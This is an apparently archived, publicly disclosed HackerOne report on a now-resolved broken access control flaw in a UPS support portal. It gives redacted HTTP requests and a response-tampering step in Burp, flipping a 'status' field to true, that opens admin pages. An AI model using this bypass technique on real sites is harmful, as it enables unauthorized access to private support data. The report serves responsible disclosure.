---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - vuln/xss
  - vuln/broken-access-control
  - vuln/privilege-escalation
  - vuln/cors-misconfig
  - trigger/admin-required
  - trigger/cors-origin
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2022-06-18
submitted: 2022-04-13T05:29:29.116Z
bounty_usd: null
votes: 55
cve: []
program: "[[programs/ups|UPS VDP]]"
reporter: "nayefhamouda"
source: "https://hackerone.com/reports/1539426"
title: "Broken access control "
---
# Broken access control 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 55 | **Program:** UPS VDP | **Disclosed:** 2022-06-18

- Report: [https://hackerone.com/reports/1539426](https://hackerone.com/reports/1539426)
- CWE: Improper Authentication - Generic
- Submitted: 2022-04-13T05:29:29.116Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
hello ups team ,,,
I've found broken access control vulnerability in your sites 
It allows me to access the admin panel of the support team, and I can view all requests within the site

vulnerable domains:**█████**
## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. go to **█████████** 
  2. go to **████████████████** ,put any email address and intercept the request
  
```
POST /api/Account/SendTempPassword/?userName=█████████████ HTTP/2
Host: ██████████████████
Cookie: ████████
Content-Length: 0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: ██████████████████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7


```
  3.On the burp site, intercept the response for this request and change this value to 
Then change the **"status"** value of this request from false to true

##response:

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='███████████████-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: ██████████████████ ████████████ GMT
Content-Length: 89

{"status":true,"errorMessage":"Username does not exist. Please enter correct Username."}
```

  4. After that, go to this path  **/resetPassword** You will notice that this page has been opened without problems

███████████

Go to user or report and you will notice that it opens normally and you can fully control it

I made a video of the vulnerability that you can watch

##video POC:

███████

## Impact

The attacker can hack the admin control panel and view and modify all reports

## Timeline

- **Report Filed**
- **Report Informative**
- **2022-04-14** @nayefhamouda: Apparently you didn't see how I ended up reading the files
I'd like to read all the reports How does this happen if I actually just view the js page?
- **2022-04-14** @nayefhamouda: As you can see, I can read and control all the report files
- **Report Reopened**
- **Report Severity Updated**
- **Report Triaged**
- **2022-05-02** @trymeplz: Greetings ████████████████

Thank you for your submission. Were were able to successfully validate this finding. We will keep you abreast on a resolution once updated upon progress. 

Thanks again
- **2022-05-19** @trymeplz: ████████████
Thank you again for your submission. We look forward to working with you again. Happy ██████████!!!

@███████████████████
Thanks again
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
